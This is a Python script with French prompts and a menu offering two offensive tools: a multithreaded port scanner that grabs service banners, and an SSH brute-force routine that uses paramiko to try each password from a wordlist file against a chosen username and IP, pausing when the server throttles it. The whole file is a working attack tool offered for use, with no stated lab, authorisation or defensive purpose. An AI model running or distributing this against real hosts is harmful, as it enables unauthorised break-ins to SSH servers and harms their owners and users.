import socket
import threading
import time
import paramiko


def grab_banner(ip, port, results, lock):
    print(f"Scanning port {port}...", end='\r')
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                try:
                    banner = s.recv(1024).decode().strip()
                    if not banner:
                        if port in [80, 443]:
                            s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                            banner = s.recv(1024).decode().strip()
                    result = f"[+] Port {port} ouvert - Service détecté : {banner}\n"
                    print(result, end='')
                    with lock:
                        results.append(result)
                except:
                    pass
    except:
        pass


def scan_ports(ip, start_port, end_port):
    threads = []
    results = []
    lock = threading.Lock()

    for port in range(start_port, end_port + 1):
        print(f"Scanning port {port}...")
        thread = threading.Thread(target=grab_banner, args=(ip, port, results, lock))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    with open("scan_results.txt", "w") as f:
        f.writelines(results)

    print("\nLes résultats ont été enregistrés dans scan_results.txt")


def bruteforce_ssh(target_ip, target_port, username, password_file):
    try:
        with open(password_file, "r") as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()
            print(f"[+] Tentative avec : {username}:{password}", end='\r')
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, port=target_port, username=username, password=password, timeout=1)
                print(f"\n[!] Succès avec : {username}:{password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                pass
            except paramiko.SSHException:
                print("\n[!] Trop de connexions, ralentissement...")
                time.sleep(5)
            except Exception as e:
                pass
            time.sleep(0.5)  # Pause entre les tentatives

        print("\n[-] Aucun mot de passe trouvé")
    except FileNotFoundError:
        print("\n[!] Fichier de mots de passe introuvable")


if __name__ == "__main__":
    while True:
        print("\nMenu Principal")
        print("1. Scanner")
        print("2. Attaquer SSH")
        print("3. Quitter")
        choice = input("Votre choix : ")

        if choice == "1":
            ip = input("Entrez l'adresse IP à scanner : ")
            start_port = int(input("Port de début : "))
            end_port = int(input("Port de fin : "))
            scan_ports(ip, start_port, end_port)

        elif choice == "2":
            target_ip = input("Entrez l'adresse IP cible : ")
            target_port = int(input("Port SSH (par défaut 22) : "))
            username = input("Nom d'utilisateur : ")
            password_file = "mdp.txt"
            bruteforce_ssh(target_ip, target_port, username, password_file)

        elif choice == "3":
            print("Sortie du programme.")
            break

        else:
            print("Choix invalide, veuillez réessayer.")
